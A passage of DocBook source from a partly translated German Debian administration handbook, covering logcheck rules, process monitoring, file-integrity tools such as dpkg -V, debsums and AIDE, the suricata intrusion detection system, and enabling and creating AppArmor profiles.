      <para><command>logcheck</command> kann in drei mehr oder weniger detaillierten Modi laufen: <emphasis>Paranoid</emphasis>, <emphasis>Server</emphasis> und <emphasis>Arbeitsplatzrechner</emphasis>. Der erste ist <emphasis>sehr</emphasis> ausführlich und sollte wohl eher auf besondere Server, wie zum Beispiel Firewalls, beschränkt bleiben. Der zweite (voreingestellte) Modus wird für die meisten Server empfohlen. Der letzte ist für Arbeitsplatzrechner bestimmt und ist noch knapper (er unterdrückt mehr Meldungen).</para>

      <para>In allen drei Fällen sollte <command>logcheck</command> wohl so angepasst werden, dass es einige zusätzliche Meldungen ausschließt (in Abhängigkeit von den installierten Diensten), es sei denn, dass der Administrator tatsächlich jede Stunde stapelweise lange uninteressante E-Mails empfangen möchte. Da das Verfahren zur Auswahl der Meldungen recht kompliziert ist, ist es notwendig - wenn auch schwierig - die Datei <filename>/usr/share/doc/logcheck-database/README.logcheck-database.gz</filename> durchzulesen.</para>

      <para>Die eingesetzten Regeln können in mehrere Arten unterteilt werden:</para>
      <itemizedlist>
        <listitem>
	  <para>solche, die eine Meldung als einen Einbruchsversuch einstufen (in einer Datei im Verzeichnis <filename>/etc/logcheck/cracking.d/</filename> gespeichert);</para>
        </listitem>
        <listitem>
	  <para>solche, die eine derartige Einstufung aufheben (<filename>/etc/logcheck/cracking.ignore.d/</filename>);</para>
        </listitem>
        <listitem>
	  <para>solche, die eine Meldung als Sicherheitswarnung einordnen (<filename>/etc/logcheck/violations.d/</filename>);</para>
        </listitem>
        <listitem>
	  <para>solche, die diese Einordnung aufheben (<filename>/etc/logcheck/violations.ignore.d/</filename>);</para>
        </listitem>
        <listitem>
	  <para>und schließlich solche, die auf die übrigen Meldungen zutreffen (als sogenannte <emphasis>Systemvorfälle</emphasis> angesehen werden).</para>
        </listitem>
      </itemizedlist>

      <sidebar>
        <title><emphasis>VORSICHT</emphasis> Eine Meldung ignorieren</title>

	<para>Eine Meldung, die als Einbruchsversuch oder als Sicherheitswarnung markiert worden ist (aufgrund einer Regel, die in einer Datei namens <filename>/etc/logcheck/violations.d/meine_datei</filename> gespeichert ist), kann nur mit einer Regel in den Dateien <filename>/etc/logcheck/violations.ignore.d/meine_datei</filename> oder <filename>/etc/logcheck/violations.ignore.d/meine_datei-<replaceable>erweiterung</replaceable></filename> ignoriert werden.</para>
      </sidebar>

      <para>Ein Systemvorfall wird immer angezeigt, es sei denn, eine Regel in einem der Verzeichnisse des Typs <filename>/etc/logcheck/ignore.d.{paranoid,server,arbeitsplatzrechner}/</filename> bestimmt, dass der Vorfall ignoriert werden soll. Es werden natürlich nur die Verzeichnisse berücksichtigt, deren Ausführlichkeitsgrad gleich dem oder höher als der ausgewählte Betriebsmodus ist.</para>
    </section>
    <section id="sect.monitoring-activity">
      <title>Aktivitäten überwachen</title>
      <indexterm><primary>Überwachung</primary><secondary>Aktivität</secondary></indexterm>
      <indexterm><primary>Aktivität, Überwachung</primary></indexterm>
      <section id="sect.real-time-monitoring">
        <title>In Echtzeit</title>

	<para><command>top</command> ist ein interaktives Hilfsprogramm, das eine Liste der gegenwärtig laufenden Prozesse anzeigt. Die voreingestellte Reihenfolge hängt vom momentanen Umfang der Prozessornutzung ab und kann mithilfe der <keycap>P</keycap>-Taste abgerufen werden. Andere Sortierreihenfolgen sind unter anderem nach belegtem Speicher (<keycap>M</keycap>-Taste), nach gesamter Prozessorzeit (<keycap>T</keycap>-Taste) und nach Prozesskennung (<keycap>N</keycap>-Taste). Mit der <keycap>k</keycap>-Taste kann ein Prozess abgebrochen werden, indem seine Kennung eingegeben wird. Die <keycap>r</keycap>-Taste ermöglicht das <emphasis>renicing</emphasis> eines Prozesses, das heißt, die Änderung seiner Priorität.</para>
        <indexterm><primary><command>top</command></primary></indexterm>

	<para>Wenn das System überlastet zu sein scheint, ist <command>top</command> ein großartiges Instrument, um zu sehen, welche Prozesse um die Prozessorzeit konkurrieren oder zu viel Speicher verbrauchen. Insbesondere ist es häufig interessant zu überprüfen, ob die Prozesse, die Ressourcen verbrauchen, den tatsächlichen Diensten entsprechen, die der Rechner bekanntermaßen beherbergt. Ein unbekannter Prozess, der unter dem Benutzernamen www-data läuft, sollte wirklich hervorstechen und kann untersucht werden, da er möglicherweise ein Programm ist, das durch eine Schwachstelle in einer Web-Anwendung auf dem System installiert wurde und ausgeführt wird.</para>

	<para><command>top</command> ist ein sehr flexibles Hilfsprogramm, und seine Handbuchseite beschreibt ausführlich, wie seine Anzeige individuell eingerichtet und an persönliche Bedürfnisse und Gewohnheiten angepasst werden kann.</para>

        <para>Das grafische Hilfsprogramm <command>gnome-system-monitor</command> ist <command>top</command> ähnlich und bietet etwa die gleichen Leistungsmerkmale.</para>

        <indexterm><primary><command>gnome-system-monitor</command></primary></indexterm>
      </section>
      <section id="sect.monitoring-history">
        <title>Verlauf</title>
        <indexterm><primary>Aktivität, Verlauf</primary></indexterm>

	<para>Prozessorauslastung, Netzwerkverkehr und freier Plattenplatz sind Informationen, die sich ständig ändern. Es ist häufig nützlich, den Verlauf ihrer Entwicklung festzuhalten, um genau feststellen zu können, wie der Rechner genutzt wird.</para>
        <indexterm><primary>SNMP</primary></indexterm>
        <indexterm><primary>Simple Network Management Protocol</primary></indexterm>

	<para>Für diese Aufgabe gibt es zahlreiche spezialisierte Hilfsprogramme. Die meisten von ihnen können Daten über SNMP (<emphasis>Simple Network Management Protocol</emphasis>) einholen, um diese Informationen an einer Stelle zusammenzufassen. Ein weiterer Nutzen besteht darin, dass auf diese Weise Daten von Netzwerkelementen eingeholt werden können, die keine Universalrechner sind, wie spezialisierte Netzwerkrouter oder -switche.</para>

	<para>Dieses Buch behandelt Munin ausführlich als Teil von <xref linkend="advanced-administration" xrefstyle="select: label quotedtitle" /> (siehe <xref linkend="sect.munin" />). Debian stellt ebenfalls ein ähnliches Hilfsprogramm bereit: <emphasis role="pkg">cacti</emphasis>. Sein Einsatz ist etwas komplizierter, da es ausschließlich auf SNMP beruht. Obwohl es eine Web-Schnittstelle hat, benötigt das Verständnis der Konzepte, die für die Konfigurierung verwendet werden, noch einige Anstrengung. Die Lektüre der HTML-Dokumentation (<filename>/usr/share/doc/cacti/html/index.html</filename>) ist daher als Voraussetzung anzusehen.</para>

        <sidebar>
          <title><emphasis>ALTERNATIVE</emphasis> <command>mrtg</command></title>
          <indexterm><primary><command>mrtg</command></primary></indexterm>

	  <para><command>mrtg</command> (in dem Paket ähnlichen Namens) ist ein älteres Hilfsprogramm. Trotz einiger Ecken und Kanten kann es Verlaufsdaten zusammenfassen und als Diagramme anzeigen. Es enthält eine Reihe spezieller Skripte zur Sammlung der am häufigsten überprüften Daten wie Prozessorlast, Netzwerkverkehr, Webseitenzugriffe und so weiter.</para>

	  <para>Die Pakete <emphasis role="pkg">mrtg-contrib</emphasis> und <emphasis role="pkg">mrtgutils</emphasis> enthalten Beispielskripte, die direkt verwendet werden können.</para>
        </sidebar>
      </section>
    </section>
    <section>
      <title>Änderungen erkennen</title>

      <para>Nachdem das System installiert und konfiguriert ist, gibt es, abgesehen von Sicherheitsaktualisierungen, normalerweise keinen Grund, dass Dateien und Verzeichnisse sich weiterentwickeln, Daten ausgenommen. Es ist daher interessant sicherzustellen, dass Dateien sich in der Tat nicht ändern: jede unerwartete Veränderung wäre daher eine Untersuchung wert. Dieser Abschnitt stellt einige Hilfsprogramme vor, die Dateien überwachen und den Administrator warnen können, wenn eine unerwartete Veränderung auftritt (oder einfach derartige Veränderungen auflisten).</para>
      <section id="sect.dpkg-verify">
        <title>Pakete mit <command>logcheck</command> prüfen</title>
        <indexterm><primary><command>dpkg</command></primary><secondary><command>dpkg --verify</command></secondary></indexterm>
        <sidebar>
          <title><emphasis>WEITERE SCHRITTE</emphasis> Schutz vor vorgelagerten Veränderungen</title>

	  <para><command>dpkg --verify</command> ist nützlich zur Entdeckung von Änderungen an Dateien, die aus einem Debian-Paket stammen. Jedoch ist es nutzlos, falls das Paket selbst beschädigt ist, weil zum Beispiel der Debian-Spiegelserver kompromittiert wurde. Um sich gegen diese Art von Angriffen zu schützen, ist es erforderlich, APTs Verifikationssystem für digitale Signaturen zu benutzen (siehe <xref linkend="sect.package-authentication" />) und darauf zu achten, nur Pakete zertifizierten Ursprungs zu installieren.</para>
        </sidebar>

        <para><command>dpkg --verify</command> (oder <command>dpkg -V</command>) ist ein interessantes Tool, weil es herausfindet welche installierten Dateien (möglicherweise von einem Angreifer) modifiziert wurden aber dies sollte man nicht für bare Münze nehmen. Um seine Arbeit zu verrichten bezieht es sich auf Prüfsummen i der dpkg eigenen Datenbank welche auf der lokalen Festplatte liegt (man findet sie unter <filename>/var/lib/dpkg/info/<replaceable>package</replaceable>.md5sums</filename>).  Ein gründlicher Angreifer wird diese Dateien also mit den neuen Prüfsummen der manipulierten Dateien aktualisieren.</para>

        <sidebar>
          <title><emphasis>ZURÜCK ZU DEN GRUNDLAGEN</emphasis> Dateifingerabdruck</title>
	  <indexterm><primary>Fingerabdruck</primary></indexterm>
	  <indexterm><primary>Prüfsumme</primary></indexterm>
	  <indexterm><primary>MD5</primary></indexterm>
	  <indexterm><primary>SHA1</primary></indexterm> 
          <para>Zur Erinnerung: ein Fingerabdruck ist ein Wert, häufig eine Zahl (wenn auch in hexadezimaler Schreibweise), die eine Art Signatur für den Inhalt der Datei enthält. Diese Signatur wird mit einem Algorithmus berechnet (MD5 und SHA1 sind bekannte Beispiele), der mehr oder weniger garantiert, dass selbst kleinste Veränderungen des Dateiinhalts eine Änderung des Fingerabdrucks bewirken; dies wird als „Lawineneffekt“ bezeichnet. Er ermöglicht es, einen einfachen numerischen Fingerabdruck als Lackmustest zu verwenden, um zu überprüfen, ob der Inhalt einer Datei verändert wurde. Diese Algorithmen sind nicht umkehrbar; mit anderen Worten, bei den meisten von ihnen ermöglicht die Kenntnis eines Fingerabdrucks es nicht, den dazugehörigen Inhalt zu finden. Jüngste mathematische Fortschritte schwächen anscheinend die absolute Gültigkeit dieser Prinzipien, aber ihre Verwendung ist bisher nicht infrage gestellt, da es wohl nach wie vor eine recht schwierige Aufgabe ist, einen anderen Inhalt zu erstellen, der denselben Fingerabdruck ergibt.</para>
        </sidebar>

        <para>Das Ausführen von <command>dpkg -V</command> überprüft alle installierten Pakete und gibt eine Zeile pro Datei mit fehlgeschlagenem Test aus. Das Ausgabeformat ist das gleiche wie das von <command>rpm -V</command>, wobei jedes Zeichen einem Test auf bestimmte Metadaten entspricht. Leider speichert <command>dpkg</command> die für die meisten Tests benötigten Metadaten nicht und gibt daher Fragezeichen aus. Derzeit kann nur der Prüfsummentest eine "5" für das dritte Zeichen ergeben (wenn er fehlschlägt).</para>
        <screen>
<computeroutput># </computeroutput><userinput>dpkg -V</userinput>
<computeroutput>??5??????   /lib/systemd/system/ssh.service
??5?????? c /etc/libvirt/qemu/networks/default.xml
??5?????? c /etc/lvm/lvm.conf
??5?????? c /etc/salt/roster</computeroutput></screen>
        <para>Im obigen Beispiel meldet dpkg an der Servicedatei von SSH eine Änderung, die der Administrator an der gepackten Datei vorgenommen hat, anstatt einen entsprechenden <filename>/etc/system/system/ssh.service</filename> Override zu verwenden (der unter <filename>/etc</filename> gespeichert würde, so wie jede Änderung einer Konfiguration sein sollte). Außerdem werden mehrere Konfigurationsdateien (gekennzeichnet durch den Buchstaben "c" im zweiten Feld) aufgelistet, die korrekt geändert wurden.</para>
      </section>

      <section id="sect.debsums">
        <title>Pakete auditieren: <command>debsums</command> und seine Grenzen</title>
        <indexterm><primary><command>debsums</command></primary></indexterm>

        <para><command>debsums</command> ist der Vorgänger von <command>dpkg -V</command> und damit meist veraltet. Es hat die gleichen Einschränkungen wie dpkg. Glücklicherweise können einige der Einschränkungen umgangen werden (während dpkg keine ähnlichen Workarounds bietet).</para>

        <para>Weil man den Daten auf der Festplatte nicht trauen kann, ermöglicht <command>debsums</command> Prüfungen basierend auf <filename>.deb</filename> Dateien anstatt sich auf die dpkg Datenbank zu verlassen. Um gesicherte <filename>.deb</filename> Dateien für alle installierten Pakete herunterzuladen können wir uns auf die von APT beglaubigten Downloads verlassen. Diese Aktion kann sehr langsam und langwierig sein und sollte daher als proaktive Technik in Betracht gezogen werden und nicht regelmäßig verwendet werden.</para>

        <screen>
<computeroutput># </computeroutput><userinput>apt-get --reinstall -d install `grep-status -e 'Status: install ok installed' -n -s Package`</userinput>
<computeroutput>[ ... ]
# </computeroutput><userinput>debsums -p /var/cache/apt/archives --generate=all</userinput></screen>

	<para>Man beachte, dass in diesem Beispiel der Befehl <command>grep-status</command> aus dem Paket <emphasis role="pkg">grep-dctrl</emphasis> verwendet wird, das nicht standardmäßig installiert ist.</para>
      </section>
      <section>
        <title>Dateien überwachen: AIDE</title>
        <indexterm><primary><emphasis role="pkg">aide</emphasis> (Debian-Paket)</primary></indexterm>

	<para>Das Hilfsprogramm AIDE (<emphasis>Advanced Intrusion Detection Environment</emphasis>) ermöglicht es, die Unversehrtheit von Dateien zu überprüfen und jede Veränderung durch einen Vergleich mit einem zuvor festgehaltenen Abbild des intakten Systems zu entdecken. Dieses Abbild ist als Datenbank (<filename>/var/lib/aide/aide.db</filename>) abgespeichert, die relevante Informationen über alle Dateien des Systems enthält (Fingerabdrücke, Berechtigungen, Zeitstempel und so weiter). Diese Datenbank wird erstmals mit dem Befehl <command>aideinit</command> initialisiert; sie wird dann täglich (mit dem Skript <filename>/etc/cron.daily/aide</filename>) genutzt, um nachzuprüfen, dass sich nichts Relevantes verändert hat. Wenn Veränderungen entdeckt werden, hält AIDE diese in Protokolldateien fest (<filename>/var/log/aide/*.log</filename>) und sendet seine Befunde per E-Mail an den Administrator.</para>

        <sidebar>
          <title><emphasis>IN DER PRAXIS</emphasis> Die Datenbank schützen</title>

	  <para>Da AIDE eine lokale Datenbank nutzt, um den Status der Dateien zu vergleichen, ist die Gültigkeit seiner Ergebnisse direkt an die Gültigkeit der Datenbank gebunden. Falls ein Angreifer auf einem kompromittierten System Administratorrechte erlangt, ist er in der Lage, die Datenbank auszutauschen und so seine Spuren zu verwischen. Eine mögliche Behelfslösung könnte darin bestehen, die Referenzdaten auf einem schreibgeschützten Medium zu speichern.</para>
        </sidebar>

	<para>Viele Optionen in <filename>/etc/default/aide</filename> können dazu verwendet werden, das Verhalten des Pakets <emphasis role="pkg">aide</emphasis> zu justieren. AIDEs eigentliche Konfiguration ist in <filename>/etc/aide/aide.conf</filename> und <filename>/etc/aide/aide.conf.d/</filename> gespeichert (diese Dateien werden genau genommen nur von <command>update-aide.conf</command> dazu benutzt, die Datei <filename>/var/lib/aide/aide.conf.autogenerated</filename> zu erstellen). Die Konfiguration gibt an, welche Eigenschaften welcher Dateien überprüft werden sollen. Der Inhalt von Protokolldateien verändert sich zum Beispiel regelmäßig, und derartige Veränderungen können ignoriert werden, solange die Berechtigungen dieser Dateien die gleichen bleiben. Aber sowohl der Inhalt als auch die Berechtigungen von ausführbaren Dateien müssen unverändert bleiben. Obwohl die Konfigurationssyntax nicht sehr komplex ist, ist sie nicht völlig intuitiv. Daher wird empfohlen, die Handbuchseite <citerefentry><refentrytitle>aide.conf</refentrytitle> <manvolnum>5</manvolnum></citerefentry> zu lesen.</para>

	<para>Eine neue Version der Datenbank wird täglich in <filename>/var/lib/aide/aide.db.new</filename> erstellt; falls alle aufgenommenen Veränderungen legitim waren, kann sie als Ersatz für die Referenzdatenbank verwendet werden.</para>

        <sidebar>
          <title><emphasis>ALTERNATIVE</emphasis> Tripwire und Samhain</title>

	  <para>Tripwire ist AIDE sehr ähnlich; selbst die Syntax der Konfigurationsdatei ist fast die gleiche. Die Hauptergänzung, die von <emphasis role="pkg">tripwire</emphasis> bereitgestellt wird, ist ein Verfahren, die Konfigurationsdatei zu signieren, so dass ein Angreifer mit ihr nicht auf eine andere Version der Referenzdatenbank verweisen kann.</para>

	  <para>Samhain bietet ebenfalls ähnliche Leistungsmerkmale, sowie einige Funktionen, um Rootkits zu entdecken (siehe Seitenleiste <xref linkend="sidebar.the-checksecurity-and-chkrootkit-rkhunter-packages" />). Es kann auch netzwerkweit eingesetzt werden und seine Spuren (mit einer Signatur) auf einem zentralen Server festhalten.</para>
        </sidebar>

        <sidebar id="sidebar.the-checksecurity-and-chkrootkit-rkhunter-packages">
          <title><emphasis>KURZER BLICK</emphasis> Die Pakete <emphasis role="pkg">checksecurity</emphasis> und <emphasis role="pkg">chkrootkit</emphasis>/<emphasis role="pkg">rkhunter</emphasis></title>
          <indexterm><primary><emphasis role="pkg">checksecurity</emphasis></primary></indexterm>

	  <para>Das erste dieser Pakete enthält verschiedene kleine Skripte, die grundlegende Prüfungen des Systems durchführen (leere Passwörter, neue setuid-Dateien usw.) und den Administrator, falls nötig, warnen. Allerdings sollte sich trotz seines eindeutigen Namens kein Administrator nur auf dieses Paket verlassen, wenn er dafür sorgen möchte, dass ein Linux-System sicher ist.</para>

	  <para>Die Pakete <emphasis role="pkg">chkrootkit</emphasis> und <emphasis role="pkg">rkhunter</emphasis> ermöglichen es, nach möglicherweise auf dem System installierten <emphasis>Rootkits</emphasis> Ausschau zu halten. Zur Erinnerung: dies sind Programme, die dazu bestimmt sind, die Kompromittierung eines Systems zu verbergen und gleichzeitig diskret den Rechner im Griff zu halten. Die Tests sind nicht zu 100% zuverlässig, aber sie können gewöhnlich die Aufmerksamkeit des Administrators auf die möglichen Probleme lenken.</para>
        </sidebar>
      </section>
    </section>
    <section id="sect.intrusion-detection">
      <title>Eindringen entdecken (IDS/NIDS)</title>
      <indexterm><primary>Entdeckung, Eindringen</primary></indexterm>
      <indexterm><primary>Einbruchserkennung</primary></indexterm>
      <indexterm><primary>IDS</primary></indexterm>
      <indexterm><primary>Einbruchmeldesystem</primary></indexterm>
      <indexterm><primary>NIDS</primary></indexterm>
      <indexterm><primary>Netzwerk</primary><secondary>IDS</secondary></indexterm>

      <sidebar>
        <title><emphasis>ZURÜCK ZU DEN GRUNDLAGEN</emphasis> Denial of Service</title>
        <indexterm><primary>Denial of Service</primary></indexterm>

	<para>Ein „Denial-of-Service“-Angriff hat nur ein Ziel: einen Dienst nicht verfügbar zu machen. Ob ein solcher Angriff nun darin besteht, den Server mit Anfragen zu überlasten oder einen Fehler auszunutzen, das Ergebnis ist das gleiche: der Dienst ist nicht mehr funktionsfähig. Die normalen Benutzer sind unzufrieden, und der Ruf der Organisation, die den angegriffenen Netzwerkdienst bereitstellt, erleidet Schaden (und verliert möglicherweise Einnahmen, falls zum Beispiel der Dienst eine E-Commerce-Website war).</para>

	<para>Solch ein Angriff erfolgt manchmal „verteilt“; dazu gehört es normalerweise, den Server mit einer großen Anzahl von Anfragen, die von vielen verschiedenen Quellen kommen, zu überlasten, so dass der Server nicht mehr imstande ist, die seriösen Anfragen zu beantworten. Diese Art von Angriffen hat bekannte Abkürzungen erhalten: <acronym>DDoS</acronym> und <acronym>DoS</acronym> (je nachdem, ob der Denial-of-Service-Angriff verteilt ist oder nicht).</para>
      </sidebar>

      <para><command>suricata</command> (im gleichnamigen Debian-Paket) ist ein NIDS - ein <emphasis>Network Intrusion Detection System</emphasis>. Seine Funktion besteht darin, das Netzwerk abzuhören und zu versuchen, Eindringversuche oder feindliche Handlungen (einschließlich eines Denial-of-Service-Angriffs) zu entdecken. Alle diese Vorgänge werden in verschiedenen Dateien unter <filename>/var/log/suricata</filename> protokolliert. Es gibt Tools von Drittanbietern (Kibana/logstash) mit denen man die gesammelten Daten besser durchsuchen kann. <ulink type="block" url="http://suricata-ids.org" /><ulink type="block" url="https://www.elastic.co/products/kibana" /></para>
      <indexterm><primary><command>snort</command></primary></indexterm>
      <indexterm><primary><command>suricata</command></primary></indexterm>

      <sidebar>
        <title><emphasis>VORSICHT</emphasis> Wirkungsbereich</title>

	<para>Die Effektivität von <command>suricata</command> wird durch den Datenverkehr begrenzt, der an der überwachten Netzwerk-Schnittstelle sichtbar ist. Es kann natürlich nichts entdecken, wenn es den tatsächlichen Datenverkehr nicht beobachten kann. Wenn es an einen Netzwerkswitch angeschlossen ist, wird es daher nur Angriffe überwachen, die auf den Rechner, auf dem es läuft, abzielen, was möglicherweise nicht die Absicht ist. Der Rechner, der <command>suricata</command> beherbergt, sollte daher an den „Spiegel“-Port des Switches angeschlossen werden, der normalerweise speziell dafür vorgesehen ist, Switche zu verketten und daher allen Datenverkehr erhält.</para>
      </sidebar>

      <para>Die Konfiguration von suricata beinhaltet die Überprüfung und Bearbeitung von <filename>/etc/suricata/suricata-debian.yaml</filename>, was sehr lang daueren kann, da jeder Parameter reichlich kommentiert wird. Eine minimale Konfiguration erfordert die Beschreibung des Adressbereichs, den das lokale Netzwerk abdeckt (Parameter <literal>HOME_NET</literal>). In der Praxis bedeutet dies der Umfang aller möglichen Angriffsziele. Aber um das Beste daraus zu machen, muss man es vollständig lesen und an die örtlichen Gegebenheiten anpassen.</para>
      <para>Außerdem sollten Sie <filename>/etc/default/suricata</filename> bearbeiten, um die Netzwerkschnittstelle für die Überwachung zu definieren und das Initskript zu aktivieren (durch Setzen von <literal>RUN=yes</literal>). Sie können auch <literal>LISTENMODE=pcap</literal> setzen, da die Standardeinstellung <literal>LISTENMODE=nfqueue</literal> eine weitere Konfiguration erfordert, um korrekt zu funktionieren (die netfilter-Firewall muss so konfiguriert sein, dass sie Pakete an eine von Suricata verwaltete User Space-Warteschlange über das <literal>NFQUEUE</literal> Ziel durchreicht).</para>
      <para><command>Suricata</command> muss einen Satz an Monitoring-Regeln erstellen um bösartiges Verhalten zu entdecken: Man findet solche Regeln im <emphasis role="pkg">snort-rules-default</emphasis> Paket. <command>Snort</command> ist historisch die Referenz im IDS Ökosystem und <command>suricata</command> kann die Regelsätze die für Snort geschrieben wurden weiterverwenden. Leider findet man das Paket nicht unter <emphasis role="distribution">Debian Jessie</emphasis> und muss daher aus einem anderen Debian Release wie etwa  <emphasis role="distribution">Testing</emphasis> oder <emphasis role="distribution">Unstable</emphasis> bezogen werden.</para>
      <para>Wahlweise kann auch <command>oinkmaster</command> (im Paket selben Namens) genutzt werden um Snort Regelsätze von externen Quellen zu beziehen.</para>
      <sidebar>
        <title><emphasis>WEITERE SCHRITTE</emphasis> Integration mit <command>prelude</command></title>

	<para>Prelude ermöglicht eine zentralisierte Überwachung von Sicherheitsinformationen. Seine modulare Architektur enthält einen Server (den <emphasis>Manager</emphasis> im Paket <emphasis role="pkg">prelude-manager</emphasis>), der Alarmmeldungen sammelt, die von verschiedenen Arten von <emphasis>Sensoren</emphasis> erzeugt werden.</para>

	<para>Suricata kann als ein solcher Sensor konfiguriert werden. Eine andere Möglichkeit ist <emphasis>prelude-lml</emphasis> (<emphasis>Log Monitor Lackey</emphasis>), das Protokolldateien überwacht (in ähnlicher Weise wie das in <xref linkend="sect.logcheck" /> beschriebene <command>logcheck</command>).</para>
        <indexterm><primary><command>prelude</command></primary></indexterm>
      </sidebar>
    </section>
  </section>
  <section id="sect.apparmor">
    <title>Einführung in AppArmor</title>
    <indexterm><primary>AppArmor</primary></indexterm>
    <section id="sect.apparmor-principles">
      <title>Prinzipien</title>
      <para>AppArmor ist  ein <emphasis>Mandatory Access Control</emphasis> System (MAC), das auf der LSM-Schnittstelle (<emphasis>Linux Security Modules</emphasis>) von Linux aufbaut. In der Praxis befragt der Kernel AppAmor vor jedem Systemaufruf, um herauszufinden, ob der Prozess autorisiert ist, den jeweiligen Vorgang auszuführen.</para>
      <indexterm><primary><emphasis>Mandatory Access Control</emphasis></primary></indexterm>
      <indexterm><primary><emphasis>Linux Security Modules</emphasis></primary></indexterm>
      <para>
        AppArmor applies a set of rules (known as “profile”) on each
        program. The profile applied by the kernel depends on the
        installation path of the program being executed.
        Contrary to SELinux (discussed in <xref linkend="sect.selinux" />),
        the rules applied do not depend on the user. All users 
        face the same set of rules when they are executing the same
        program (but traditional user permissions still apply and
        might result in different behaviour!).
      </para>
      <para>
        AppArmor profiles are stored in <filename>/etc/apparmor.d/</filename>
        and they contain a list of access control rules on resources that
        each program can make use of.
        The profiles are compiled and loaded into the kernel by the
        <command>apparmor_parser</command> command. Each profile can
        be loaded either in enforcing or complaining mode. The former
        enforces the policy and reports violation attempts, while the
        latter does not enforce the policy but still logs the system
        calls that would have been denied.
      </para>
    </section>
    <section id="sect.apparmor-setup">
      <title>AppArmor Profile einschalten und verwalten</title>
      <para>
        AppArmor support is built into the standard kernels provided by Debian.
        Enabling AppArmor is thus just a matter of installing a few
        packages and adding some parameters to the kernel command line:
      </para>
      <screen><computeroutput># </computeroutput><userinput>apt install apparmor apparmor-profiles apparmor-utils
</userinput><computeroutput>[...]
# </computeroutput><userinput>perl -pi -e 's,GRUB_CMDLINE_LINUX="(.*)"$,GRUB_CMDLINE_LINUX="$1 apparmor=1 security=apparmor",' /etc/default/grub
</userinput><computeroutput># </computeroutput><userinput>update-grub
</userinput></screen>
      <para>
        After a reboot, AppArmor is now functional and <command>aa-status</command>
        will confirm it quickly:
      </para>
      <screen>
<computeroutput># </computeroutput><userinput>aa-status</userinput>
<computeroutput>apparmor module is loaded.
44 profiles are loaded.
9 profiles are in enforce mode.
   /usr/bin/lxc-start
   /usr/lib/chromium-browser/chromium-browser//browser_java
[...]
35 profiles are in complain mode.
   /sbin/klogd
[...]
3 processes have profiles defined.
1 processes are in enforce mode.
   /usr/sbin/libvirtd (1295) 
2 processes are in complain mode.
   /usr/sbin/avahi-daemon (941) 
   /usr/sbin/avahi-daemon (1000) 
0 processes are unconfined but have a profile defined.</computeroutput></screen>
      <sidebar>
        <title><emphasis>HINWEIS</emphasis>Wetere AppArmor-Profile</title>
        <para>
          The <emphasis role="pkg">apparmor-profiles</emphasis> package
          contains profiles managed by the upstream AppArmor community.
          To get even more profiles you can install
          <emphasis role="pkg">apparmor-profiles-extra</emphasis> which
          contains profiles developed by Ubuntu and Debian.
        </para>
      </sidebar>
      <para>
        The state of each profile can be switched between
        enforcing and complaining with calls to <command>aa-enforce</command>
        and <command>aa-complain</command> giving as parameter either
        the path of the executable or the path to the policy file.
        Additionaly a profile can be entirely disabled with
        <command>aa-disable</command> or put in audit mode (to log
        accepted system calls too) with <command>aa-audit</command>.
      </para>
      <screen>
<computeroutput># </computeroutput><userinput>aa-enforce /usr/sbin/avahi-daemon</userinput>
<computeroutput>Setting /usr/sbin/avahi-daemon to enforce mode.</computeroutput>
<computeroutput># </computeroutput><userinput>aa-complain /etc/apparmor.d/usr.bin.lxc-start</userinput>
<computeroutput>Setting /etc/apparmor.d/usr.bin.lxc-start to complain mode.</computeroutput>
      </screen>
    </section>
    <section id="sect.apparmor-new-profile">
      <title>Ein neues Profil erstellen</title>
      <para>
        Even though creating an AppArmor profile is rather easy, most
        programs do not have one. This section will show you how to
        create a new profile from scratch just by using the target
        program and letting AppArmor monitor the system call it makes
        and the resources it accesses.
      </para>
      <para>
        The most important programs that need to be confined
        are the network facing programs as those are the most likely
        targets of remote attackers. That is why AppArmor conveniently
        provides an <command>aa-unconfined</command> command to list
        the programs which have no associated profile and which expose
        an open network socket. With the <literal>--paranoid</literal>
        option you get all unconfined processes that have at least one
        active network connection.
      </para>
      <screen>
<computeroutput># </computeroutput><userinput>aa-unconfined</userinput>
<computeroutput>801 /sbin/dhclient not confined
890 /sbin/rpcbind not confined
899 /sbin/rpc.statd not confined
929 /usr/sbin/sshd not confined
941 /usr/sbin/avahi-daemon confined by '/usr/sbin/avahi-daemon (complain)'
988 /usr/sbin/minissdpd not confined
1276 /usr/sbin/exim4 not confined
1485 /usr/lib/erlang/erts-6.2/bin/epmd not confined
1751 /usr/lib/erlang/erts-6.2/bin/beam.smp not confined
19592 /usr/lib/dleyna-renderer/dleyna-renderer-service not confined</computeroutput>
      </screen>
      <para>
        In the following example, we will thus try to create a
        profile for <command>/sbin/dhclient</command>. For this
        we will use <command>aa-genprof dhclient</command>. It
        will invite you to use the application in another window
        and when done to come back to <command>aa-genprof</command>
        to scan for AppArmor events in the system logs and
        convert those logs into access rules. For each logged event,
        it will make one or more rule suggestions that you can
        either approve or further edit in multiple ways:
      </para>
      <screen>
<computeroutput># </computeroutput><userinput>aa-genprof dhclient</userinput>
<computeroutput>Writing updated profile for /sbin/dhclient.
Setting /sbin/dhclient to complain mode.

Before you begin, you may wish to check if a
profile already exists for the application you
wish to confine. See the following wiki page for
more information:
http://wiki.apparmor.net/index.php/Profiles

Please start the application to be profiled in
another window and exercise its functionality now.

Once completed, select the "Scan" option below in 
order to scan the system logs for AppArmor events. 

For each AppArmor event, you will be given the 
opportunity to choose whether the access should be 
allowed or denied.

Profiling: /sbin/dhclient

[(S)can system log for AppArmor events] / (F)inish
Reading log entries from /var/log/audit/audit.log.

Profile:  /sbin/dhclient <co id="aa-genprof-execute"></co>
Execute:  /usr/lib/NetworkManager/nm-dhcp-helper
Severity: unknown

(I)nherit / (C)hild / (P)rofile / (N)amed / (U)nconfined / (X) ix On / (D)eny / Abo(r)t / (F)inish
<userinput>P</userinput>
Should AppArmor sanitise the environment when
switching profiles?

Sanitising environment is more secure,
but some applications depend on the presence
of LD_PRELOAD or LD_LIBRARY_PATH.

(Y)es / [(N)o]
<userinput>Y</userinput>
Writing updated profile for /usr/lib/NetworkManager/nm-dhcp-helper.
Complain-mode changes:
WARN: unknown capability: CAP_net_raw

Profile:    /sbin/dhclient <co id="aa-genprof-capability"></co>
Capability: net_raw
Severity:   unknown

[(A)llow] / (D)eny / (I)gnore / Audi(t) / Abo(r)t / (F)inish
<userinput>A</userinput>
Adding capability net_raw to profile.

Profile:  /sbin/dhclient <co id="aa-genprof-read"></co>
Path:     /etc/nsswitch.conf
Mode:     r
Severity: unknown

  1 - #include &lt;abstractions/apache2-common&gt; 
  2 - #include &lt;abstractions/libvirt-qemu&gt; 
  3 - #include &lt;abstractions/nameservice&gt; 
